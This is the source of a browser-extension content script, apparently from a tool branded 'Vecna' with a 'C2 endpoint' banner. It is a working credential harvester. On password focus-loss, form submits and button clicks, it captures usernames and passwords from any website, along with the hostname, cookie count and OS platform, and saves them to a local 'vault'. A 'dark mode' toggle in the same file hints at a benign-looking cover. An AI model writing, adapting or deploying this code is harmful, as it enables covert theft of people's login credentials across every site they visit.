const ASCII_LOGO = `
 \\ \\    / /___  __  _ _   __ _ 
  \\ \\/\\/ // -_)/ _|  ' \\ / _\` |
   \\_/\\_/ \\___|\\__||_||_|\\__,_|
      C 2   E N D P O I N T
`;

// Only print the boot sequence if armed
chrome.storage.local.get({ isVecnaActive: false }, (data) => {
    if (data.isVecnaActive) {
        console.log(`%c${ASCII_LOGO}`, "color: #00ffcc; font-weight: bold; font-family: monospace; text-shadow: 0 0 5px #00ffcc;");
        console.log("%c[SYSTEM ARMED] Listening for DOM mutations...", "color: #ff003c; background: #111; padding: 4px; border-radius: 3px; border: 1px solid #ff003c;");
    }
});

function interceptData(triggerReason) {
    chrome.storage.local.get({ isVecnaActive: false, vault: [] }, (data) => {
        if (!data.isVecnaActive) return; // Kill switch

        const passField = document.querySelector('input[type="password"]');
        if (!passField || !passField.value) return; 

        const userField = document.querySelector('input[type="email"], input[name*="user" i], input[id*="user" i], input[type="text"]');
        
        const payload = {
            Target: window.location.hostname,
            User: userField ? userField.value : "Unknown",
            Pass: passField.value,
            Session: document.cookie ? `Active (${document.cookie.split(';').length} tokens)` : "None",
            OS: navigator.platform,
            Vector: triggerReason
        };

        const last = data.vault[data.vault.length - 1];
        if (last && last.Pass === payload.Pass && last.User === payload.User) return; 
        
        // --- AESTHETIC CONSOLE OUTPUT ---
        console.groupCollapsed(`%c 👁️ VECNA INTEL INTERCEPT : ${payload.Target} `, `background: #0a0a0a; border: 1px solid #00ffcc; color: #00ffcc; padding: 6px; font-size: 13px; border-radius: 4px; font-family: monospace; letter-spacing: 1px;`);
        console.log(`%c TIME: %c ${new Date().toLocaleTimeString()} `, `color: #ff003c; font-weight: bold;`, `color: #fff;`);
        console.log(`%c VECTOR: %c ${triggerReason} `, `color: #ff003c; font-weight: bold;`, `color: #fff;`);
        console.table([payload]);
        console.groupEnd();
        // --------------------------------

        data.vault.push(payload);
        chrome.storage.local.set({ vault: data.vault });
    });
}

document.addEventListener('focusout', (e) => { if (e.target.type === 'password') interceptData('Focus_Lost'); }, true);
document.addEventListener('submit', () => interceptData('Form_Submit'), true);
document.addEventListener('click', (e) => { if (e.target.tagName === 'BUTTON') interceptData('Button_Click'); }, true);

chrome.runtime.onMessage.addListener((req) => {
    if (req.action === "toggleDark") {
        req.state ? document.documentElement.classList.add('vecna-dark-mode') : document.documentElement.classList.remove('vecna-dark-mode');
    }
});
